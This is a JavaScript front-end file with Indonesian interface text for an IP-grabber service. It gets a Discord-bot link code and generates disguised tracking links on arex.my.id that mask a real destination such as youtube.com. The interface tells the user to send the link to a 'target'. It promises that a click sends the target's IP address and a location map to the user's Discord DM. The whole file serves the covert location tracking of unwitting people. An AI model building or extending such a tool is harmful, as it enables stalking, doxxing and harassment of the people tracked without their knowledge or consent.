let currentConnectCode = "";

// 1. Minta Kode /connect dari Serverless API
async function getConnectCode() {
  const display = document.getElementById('codeDisplay');
  display.innerHTML = "<span style='color:#94a3b8; font-size: 14px;'>Membuat kode...</span>";

  try {
    const res = await fetch('/api/connect?action=generate');
    const data = await res.json();

    if (data.status === 'success') {
      currentConnectCode = data.code;
      display.innerHTML = `KODE: <span style="color:#38bdf8">${data.code}</span>`;
      
      alert(`Kode Kamu: ${data.code}\n\nBuka DM Bot Discord Kamu lalu kirim pesan:\n/connect ${data.code}`);
    }
  } catch (err) {
    display.innerHTML = "<span style='color:#ef4444; font-size: 14px;'>Gagal mengambil kode</span>";
  }
}

// 2. Generate Tracking Link (arex.my.id/r/x9k2)
async function generateMaskedLink() {
  const target = document.getElementById('targetUrl').value.trim();
  const res = document.getElementById('resLogger');

  if (!currentConnectCode) {
    return alert('Klik "Dapatkan Kode /connect" dulu dan kirim kodenya ke DM Bot Discord Kamu!');
  }
  if (!target) {
    return alert('Masukkan URL tujuan asli dulu (misal: youtube.com)!');
  }

  res.innerHTML = "<span style='color:#94a3b8;'>Membuat link tracking...</span>";

  try {
    const response = await fetch(`/api/r/[id]?action=create&target=${encodeURIComponent(target)}&code=${currentConnectCode}`);
    const data = await response.json();

    if (data.status === 'success') {
      res.innerHTML = `
        <div style="color: #34d399; font-weight: bold; margin-bottom: 8px;">✅ LINK TRACKING SIAP</div>
        <div style="margin-bottom: 8px;">
          <p style="font-size: 11px; color: #94a3b8; margin-bottom: 4px;">Salin & Kirim link ini ke target:</p>
          <input type="text" value="${data.shortUrl}" readonly style="width:100%; padding: 8px; background:#0f172a; border:1px solid #334155; color:#34d399; font-size:13px; border-radius:4px;" onclick="this.select()">
        </div>
        <p style="font-size: 11px; color: #94a3b8; line-height: 1.4;">
          🔒 Menggunakan domain <b>arex.my.id</b>. Begitu diklik, IP & peta lokasi target langsung terkirim otomatis ke DM Discord kamu.
        </p>
      `;
    }
  } catch (err) {
    res.innerHTML = "<span style='color:#ef4444;'>Gagal membuat link tracking.</span>";
  }
}